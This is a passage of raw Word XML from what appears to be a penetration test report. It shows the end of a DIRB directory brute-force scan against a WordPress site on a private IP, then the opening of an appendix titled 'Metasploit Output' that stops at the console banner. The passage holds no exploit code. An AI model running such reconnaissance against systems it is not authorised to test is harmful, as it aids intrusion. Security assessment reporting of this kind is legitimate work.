      </w:r>
    </w:p>
    <w:p w14:paraId="2A5BA952" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>---- Entering directory: http://172.16.221.237/wordpress/wp-content/themes/default/ ----</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="197B89E8" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-content/themes/default/404 (CODE:500|SIZE:0)                                                                                                                                                         </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="336637F6" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-content/themes/default/archive (CODE:500|SIZE:0)                                                                                                                                                     </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="737DB86C" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-content/themes/default/archives (CODE:500|SIZE:1)                                                                                                                                                    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39190231" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-content/themes/default/comments (CODE:200|SIZE:46)                                                                                                                                                   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F75EE7E" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-content/themes/default/footer (CODE:500|SIZE:206)                                                                                                                                                    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A4AFF56" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-content/themes/default/functions (CODE:500|SIZE:0)                                                                                                                                                   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A325C7B" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-content/themes/default/header (CODE:500|SIZE:165)                                                                                                                                                    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2912DD83" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-content/themes/default/image (CODE:500|SIZE:0)                                                                                                                                                       </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53C8A39C" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">==&gt; DIRECTORY: http://172.16.221.237/wordpress/wp-content/themes/default/images/                                                                                                                                                          </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53397A47" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-content/themes/default/index (CODE:500|SIZE:0)                                                                                                                                                       </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F14D121" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-content/themes/default/index.php (CODE:500|SIZE:0)                                                                                                                                                   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CA7C8F0" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-content/themes/default/links (CODE:500|SIZE:1)                                                                                                                                                       </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BD472E3" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-content/themes/default/page (CODE:500|SIZE:0)                                                                                                                                                        </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70481DD1" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-content/themes/default/screenshot (CODE:200|SIZE:10368)                                                                                                                                              </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19ACD357" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-content/themes/default/search (CODE:500|SIZE:0)                                                                                                                                                      </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16346030" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-content/themes/default/single (CODE:500|SIZE:0)                                                                                                                                                      </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="725AD206" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-content/themes/default/style (CODE:200|SIZE:10504)                                                                                                                                                   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2138200D" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">                                                                                                                                                                                                                                          </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01324D8C" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>---- Entering directory: http://172.16.221.237/wordpress/wp-content/themes/default/images/ ----</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01D59788" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A22DB33" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">    (Use mode '-w' if you want to scan it anyway)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="264031F8" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">                                                                               </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07C9BAC2" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>-----------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="610E58C6" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>END_TIME: Sun Dec  1 17:05:12 2024</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="004C42BE" w14:textId="7E709BE3" w:rsidR="004305D8" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>DOWNLOADED: 50732 - FOUND: 92</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01F30496" w14:textId="20B1B1F9" w:rsidR="004305D8" w:rsidRDefault="004305D8" w:rsidP="004305D8">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="578" w:right="4" w:hanging="578"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="33" w:name="_Toc183984575"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Appendix </w:t>
      </w:r>
      <w:r w:rsidR="002A3AE8">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> – </w:t>
      </w:r>
      <w:r w:rsidR="002A3AE8">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Metasploit Output</w:t>
      </w:r>
      <w:bookmarkEnd w:id="33"/>
    </w:p>
    <w:p w14:paraId="120CCB9F" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>root@kali:~# msfconsole</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FEC5AEC" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>[-] ***rting The Metasploit Framework console.../</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7968C023" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>[-] * WARNING: No database support: could not connect to server: Connection refused</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="429FE597" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">        Is the server running on host "localhost" (::1) and accepting</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B37BAD5" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">        TCP/IP connections on port 5432?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74074336" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>could not connect to server: Connection refused</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55AA538B" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">        Is the server running on host "localhost" (127.0.0.1) and accepting</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0253EF1D" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">        TCP/IP connections on port 5432?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6908E96C" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="15EFD5CA" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>[-] ***</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CE97309" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">                                                  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12EEF325" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">                                   ___          ____</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73F281DE" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">                               ,-""   `.      &lt; HONK &gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="396D2107" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">                             ,'  _   e )`-._ /  ----                                                                                                                                                                                       </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A98DB4B" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">                            /  ,' `-._&lt;.===-'                                                                                                                                                                                              </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4521863E" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">                           /  /                                                                                                                                                                                                            </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3227C2A1" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">                          /  ;                                                                                                                                                                                                             </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A62669E" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">              _          /   ;                                                                                                                                                                                                             </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C0783DA" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (`._    _.-"" ""--..__,'    |                                                                                                                                                                                                             </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="775A34D5" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> &lt;_  `-""                     \                                                                                                                                                                                                            </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AA9CC48" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">  &lt;`-                          :                                                                                                                                                                                                           </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F0EDE91" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">   (__   &lt;__.                  ;                                                                                                                                                                                                           </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="387D368B" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">     `-.   '-.__.      _.'    /                                                                                                                                                                                                            </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36A2527B" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">        \      `-.__,-'    _,'                                                                                                                                                                                                             </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C430650" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">         `._    ,    /__,-'                                                                                                                                                                                                                </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0255E570" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">            ""._\__,'&lt; &lt;____                                                                                                                                                                                                               </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="344F99E8" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">                 | |  `----.`.                                                                                                                                                                                                             </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CD0372B" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">                 | |        \ `.                                                                                                                                                                                                           </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AE14DF5" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">                 ; |___      \-``                                                                                                                                                                                                          </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="007861B0" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">                 \   --&lt;                                                                                                                                                                                                                   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25483A76" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">                  `.`.&lt;                                                                                                                                                                                                                    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EF78A12" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">                    `-'                                                                                                                                                                                                                    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5978CBA3" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">                                                                                                                                                                                                                                           </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A290E60" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">                                                                                                                                                                                                                                           </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64192A67" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="347C8DBB" w14:textId="77777777" w:rsidR="008C7750" w:rsidRDefault="008C7750" w:rsidP="008C7750">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
